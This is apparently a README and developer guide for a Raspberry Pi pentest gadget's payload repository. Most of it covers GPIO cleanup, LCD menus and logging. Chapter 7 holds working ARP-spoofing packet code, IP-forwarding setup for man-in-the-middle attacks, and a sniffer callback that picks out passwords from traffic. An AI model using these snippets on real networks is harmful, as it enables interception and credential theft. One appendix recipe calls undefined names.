😈 raspyjack-payloads: The Payload Stash

Maintainer: @null_lyfe

This is the central vault for all custom payloads built for the RaspyJack platform. We got a little bit of everything in here: network tools, wireless disruption, HID stuff (still fighting with the USB stack, lol), and custom phishing pages for testing.


> ⚠️ Standard Warning (Read it, don't be a scrub): This gear is for education, defense research, and testing only. Test on networks/hardware you own and have permission to touch. Don't be a jerk. If you mess up, you're on your own.
> 
RaspyJack Payload Ops: The Definitive Dev Guide
Chapter 1: The Basics — How Not to Brick the UI
Forget the fancy terms. Your job is simple: take over the screen, do the work, and then politely give it back.
1.1 The Runtime Vibe (Process Isolation) 🔬
When someone picks your script from the menu, the main program does one thing: it shoves your code into a separate process using Python's subprocess.
 * You're an Only Child: Your script runs completely alone. It has no idea what the main menu was doing. You must re-import and re-initialize everything—especially the screen and buttons.
 * The Launch Pad: Your script is always executed from the project root (/root/Raspyjack). When you're looking for files, start from there.
   * Good Path: open("loot/my_payload/results.txt", "w")
   * Bad Path: open("results.txt", "w") (That'll try to write to the main project directory and it's sloppy.)
1.2 The Golden Rule 🏆: Don't Be a Hardware Hog (GPIO Cleanup)
If your script exits without cleaning up, the GPIO pins stay locked in whatever state you left them. The next poor bastard (or the main menu) that tries to use the screen/buttons will crash or throw ugly errors.
Your cleanup() function is mandatory. Use a try...finally block. No exceptions. The finally block is guaranteed to run, even if your code throws a fatal exception.
Chapter 2: The Core Template — "Hello, RaspyJack" (Simplified)
This is the skeleton for every stable payload. Copy it. Use it. Love it.
#!/usr/bin/env python3

# --- 1. Imports: The Essential Toolkit ---
import sys, os, time, signal
import RPi.GPIO as GPIO # For buttons/pins
from PIL import Image, ImageDraw, ImageFont # For drawing on the screen

# CRITICAL: These imports set up the hardware access needed by the RaspyJack.
import LCD_Config 
import LCD_1in44

# --- 2. Configuration ---
PINS = {"KEY3": 16} # KEY3 is the universal 'GTFO' button
RUNNING = True

# --- 3. The Cleanup Handler (The most important function) ---
def cleanup(*_):
    global RUNNING
    if not RUNNING: return
    RUNNING = False
    print("Payload done. Releasing GPIO pins.")
    try: LCD_1in44.LCD().LCD_Clear() # Optional: Clear the screen on exit
    except: pass
    GPIO.cleanup() # <<< MUST BE HERE (This is the critical step)

# --- 4. Main Ops ---
if __name__ == "__main__":
    # Hooks to run cleanup on CTRL+C or system kill
    signal.signal(signal.SIGINT, cleanup) 
    signal.signal(signal.SIGTERM, cleanup)

    try:
        # 4.1 Hardware Setup (The Mandatory Pre-Flight Checklist)
        GPIO.setmode(GPIO.BCM) # Use the Broadcom SOC channel numbering (easier to read pinouts). 
        GPIO.setup(PINS["KEY3"], GPIO.IN, pull_up_down=GPIO.PUD_UP) # Set the pin as an input with a pull-up resistor (button is pressed when voltage is LOW/0).

        LCD = LCD_1in44.LCD() 
        LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        LCD.LCD_Clear()

        # 4.2 The Drawing Buffer (You draw here first)
        image = Image.new("RGB", (128, 128), "BLACK")
        draw = ImageDraw.Draw(image)
        font = ImageFont.load_default()

        # Your payload-specific UI goes here...
        draw.text((5, 5), "OPS ACTIVE", font=font, fill="RED")
        LCD.LCD_ShowImage(image, 0, 0) # Push the buffer to the screen

        # 4.3 The Main Loop (Hold the line)
        while RUNNING:
            # Check if the button is pressed (LOW voltage)
            if GPIO.input(PINS["KEY3"]) == 0: 
                break # KEY3 pressed, time to bail
            time.sleep(0.1)

    # 4.4 Guaranteed Exit
    finally:
        cleanup()

Chapter 3: UX/UI — How to Not Be Confusing
The screen is tiny (128x128). Make every pixel count.
3.1 The Button Dictionary & Debouncing (The "Jitter" Fix)
Buttons bounce. A single physical press registers as many electrical signals. We use a simple time delay (debouncing) to ignore the noise.
| Button Pin | Convention | Action |
|---|---|---|
| KEY3 | Exit/Panic | Immediately kills the payload and returns to menu. |
| LEFT | Back/Cancel | Go up a menu level or stop the current scan/action. |
| OK/KEY_PRESS | Select/Confirm | Start the attack, select the target, or confirm. |
| UP/DOWN | Navigation | Scroll menus/lists. |
The Debounce Template: You need this for every loop where you check inputs.
last_press_time = 0
DEBOUNCE_DELAY = 0.25 # Don't check inputs more than 4 times a second (4Hz)

# Inside your while RUNNING loop:
current_time = time.time()
if (current_time - last_press_time) > DEBOUNCE_DELAY:
    if GPIO.input(PINS["UP"]) == 0:
        last_press_time = current_time
        # Logic for UP button press goes here

3.2 Display Recipes 🎨 (The Canvas)
 * Coordinates: The screen is 128x128 pixels. (0, 0) is the top-left corner.
 * Load Fonts: For anything other than the terrible default font, use the Kali fonts:
   try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
except:
    font = ImageFont.load_default()

 * Centered Text: Useful helper function (see Appendix).
Chapter 4: Troubleshooting — The "Why Is This Crashed?" Section
If your script vanishes right after launch, you have the Black Box Problem. Your print() statements are going nowhere.
4.1 Log Everything to /tmp 📝 (Debug Heaven)
The /tmp/ directory is your safe space. It's a temporary folder all processes can read/write to. Use a dedicated log file to see what went wrong.
# Setup at the top
LOG_FILE = "/tmp/my_payload_debug.log"

def log(msg):
    # This function writes your status to a file, safe from the black box
    with open(LOG_FILE, "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")

# Use this block to catch fatal errors and print the full stack trace:
try:
    log("Starting main logic...")
    # Your logic...
except Exception as e:
    log(f"FATAL ERROR: {e}")
    import traceback
    with open(LOG_FILE, "a") as f:
        traceback.print_exc(file=f) # The full crash report
finally:
    log("Exiting...")
    cleanup()

4.2 Check the Logs in Real-Time
SSH into the box and run this command. It'll show you the log updates as they happen:
tail -f /tmp/my_payload_debug.log
Chapter 5: Power User Moves ⚡️
5.1 Running System Commands (The subprocess Hook)
Need to run nmap, bettercap, or some Kali tool? Use subprocess. This spawns a new shell process to execute the command.
import subprocess

log("Pinging the target...")
# The command is a list of arguments. This is safer than using a string (avoids shell injection issues).
proc = subprocess.run(["ping", "-c", "4", "192.168.1.1"], capture_output=True, text=True)

if proc.returncode == 0:
    log("Ping Success. Saving output.")
    # You MUST save your findings in the LOOT directory!
    with open("/root/Raspyjack/loot/pings/results.txt", "w") as f:
        f.write(proc.stdout)
else:
    log(f"Ping failed: {proc.stderr}")

5.2 Managing Dependencies
If your payload needs something new, you have to install it.
 * Open /root/Raspyjack/payloads/update_dependencies.sh.
 * Add your package name to the PACKAGES array (for system tools like nmap) or the PIP_PACKAGES array (for Python libraries like impacket).
 * Run the script via SSH: sudo /root/Raspyjack/payloads/update_dependencies.sh
5.3 Stashing the Loot 💰
All gathered data—passwords, handshake files, scan results—is Loot.
 * Create a sub-directory in the main loot folder for your payload: /root/Raspyjack/loot/your_payload_name/
 * Use os.makedirs(..., exist_ok=True) to make sure the folder exists before you write to it.
Chapter 7: Advanced Network Operations (The Wire) 🌐
This is where the RaspyJack shines. When working with networking, you're interacting with the Kali kernel directly.
7.1 Networking Prerequisites
Before any packet leaves the Raspberry Pi, your script often needs root privileges and to manipulate kernel settings.
 * Toggling IP Forwarding: This is non-negotiable for most MITM payloads. It turns the RaspyJack into a transparent router.
   # Enable IP Forwarding
with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
    f.write('1')

# Disable IP Forwarding (CRITICAL for cleanup)
with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
    f.write('0')

 * Interface Detection: You need to know which interface (eth0, wlan0, etc.) the traffic is moving through. The netifaces library is the most reliable way to get network info without shelling out to ifconfig.
   import netifaces

try:
    # Get the default gateway interface (e.g., 'wlan0')
    interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    print(f"Active Interface: {interface}")
except:
    print("Error: Could not determine default interface.")

7.2 Packet Crafting with Scapy
The scapy library is your primary tool for network attack payloads. It lets you build packets layer-by-layer.
Example: Sending an ARP Packet
The ARP spoofing payload uses this exact structure. We construct the packet, then send it using sendp() (send packet on layer 2).
from scapy.all import ARP, Ether, sendp

def send_fake_arp(target_ip, target_mac, gateway_ip, my_mac, interface):
    # 1. ARP Layer: The deceptive part. 
    # op=2 means 'is-at' (ARP response). psrc is the lie (We say we are the gateway).
    arp = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    
    # 2. Ethernet Layer: Handles delivery to the target's MAC address.
    ether = Ether(src=my_mac, dst=target_mac)
    
    # 3. Combine and Send (Layer 2)
    packet = ether / arp
    sendp(packet, iface=interface, verbose=False)

7.3 Real-Time Packet Sniffing
When you enter the attack state, you need to capture traffic without blocking the main loop. Sniffing must be threaded.
 * The Sniffing Callback: Scapy's sniff function requires a callback function (prn). This function is executed every time a matching packet is captured.
   from scapy.all import sniff, IP, Raw

def packet_handler(pkt):
    # Only process packets containing the IP layer
    if IP in pkt:
        # Check for Raw data (often HTTP POST, etc.)
        if Raw in pkt:
            load = pkt[Raw].load.decode(errors='ignore').lower()
            if "password" in load:
                print(f"Credential captured from {pkt[IP].src}!")

# The actual sniffing call (run this in a separate thread)
# The stop_filter should check your global RUNNING flag
sniff(iface=interface, prn=packet_handler, store=0, timeout=60) 
# store=0 is crucial to avoid running out of memory

Chapter 8: Memory & Resource Management 💾
The Raspberry Pi Zero 2 W is low-power. Efficiency is not optional.
8.1 The store=0 Rule (Sniffing)
When sniffing packets with Scapy, never let it store packets in memory for later processing. If you are sniffing on an active network, you will exhaust the RaspyJack's RAM in seconds.
 * Always use store=0: Process the packet immediately in your prn callback function, then discard it.
8.2 JSON Logging vs. PCAP
 * JSON Logs: Ideal for small amounts of extracted "loot" (credentials, metadata). Keep these lightweight.
 * PCAP (Packet Capture): Saves the entire raw packet data. Necessary for forensic review, but these files get huge fast.
   * Recommendation: Use PcapWriter to stream packets directly to the file and close it immediately when the attack stops.
     <!-- end list -->
   from scapy.all import PcapWriter

# Start:
pcap_writer = PcapWriter("loot/session_1.pcap", append=True)
# In packet_handler:
pcap_writer.write(pkt)
# Stop/Cleanup:
pcap_writer.close()

Chapter 9: Advanced UI Tricks (Making it Look Good) ✨
To achieve that "tactical" feel, use custom drawing and terminal colors.
9.1 Loading Custom Fonts
If the default font looks blocky, load a better one (Kali comes with good options).
from PIL import ImageFont

try:
    # Use a common Kali font path
    FONT_PATH = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"
    font_bold = ImageFont.truetype(FONT_PATH, 12)
    font_small = ImageFont.truetype(FONT_PATH, 9)
except IOError:
    # Fallback if the custom font isn't found
    font_bold = ImageFont.load_default()
    font_small = ImageFont.load_default()

9.2 Drawing Menus (The Core Loop)
When drawing a menu, don't re-draw the whole screen unless the state changes. Instead, draw your elements onto the ImageDraw context, and then push the final image to the LCD.
 * Clear the Buffer: draw.rectangle([(0, 0), (128, 128)], fill="BLACK")
 * Draw Elements: Use draw.text or draw.rectangle for each item.
 * Push to Screen: LCD.LCD_ShowImage(image, 0, 0)
Appendix: Code Recipes (Updated)
Recipe: Draw a Centered Message
def draw_centered_message(draw, text, y_position, font, fill="WHITE"):
    """Draws a single line of text centered on the 128px screen."""
    # This complicated math figures out the width of the text so we can center it.
    bbox = draw.textbbox((0, 0), text, font=font)
    text_width = bbox[2] - bbox[0]
    x_position = (128 - text_width) // 2
    draw.text((x_position, y_position), text, font=font, fill=fill)

Recipe: Display a Simple Menu
def draw_menu(draw, menu_items, selected_index, font):
    """Draws a list of items, highlighting the selected one with a blue box."""
    y_start = 25
    for i, item in enumerate(menu_items):
        if i == selected_index:
            # Highlight the selected item
            draw.rectangle([(0, y_start - 2), (128, y_start + 12)], fill="BLUE")
            draw_centered_message(draw, item, y_start, font, fill="YELLOW")
        else:
            draw_centered_message(draw, item, y_start, font, fill="WHITE")
        y_start += 15 # Move down 15 pixels for the next line

Recipe: Draw a Status Box
# Assuming font_bold and small_font are defined
def draw_status_box(draw, x, y, width, height, title, value, title_color="CYAN", value_color="YELLOW"):
    """Draws a simple labeled status box for real-time data."""
    # Background rectangle
    draw.rectangle([(x, y), (x + width, y + height)], fill="#1a1a1a")
    
    # Title
    draw_text(draw, title, (x + 3, y + 2), small_font, title_color)
    
    # Value (Centered within the box)
    value_text = str(value)
    bbox = draw.textbbox((0, 0), value_text, font=font_bold)
    text_width = bbox[2] - bbox[0]
    value_x = x + (width - text_width) // 2
    draw_text(draw, value_text, (value_x, y + 10), font_bold, value_color)

🏁 Finalizing the Operation: Conclusion
You now possess the foundational knowledge and the validated core structure to write production-grade payloads for the RaspyJack platform.
Remember the mission parameters:
• Cleanup is Sacred: Always release the GPIO pins and restore system states (GPIO.cleanup() and ARP/IP table restoration).
• Debug Smart: Use /tmp/ logging to avoid the black box problem.
• Be Efficient: The ARM architecture demands lean, threaded code and the diligent use of store=0 when sniffing.
May your packets always find their target and your logs remain clean.

Created by WickedNull
    Happy Hacking. 🦾

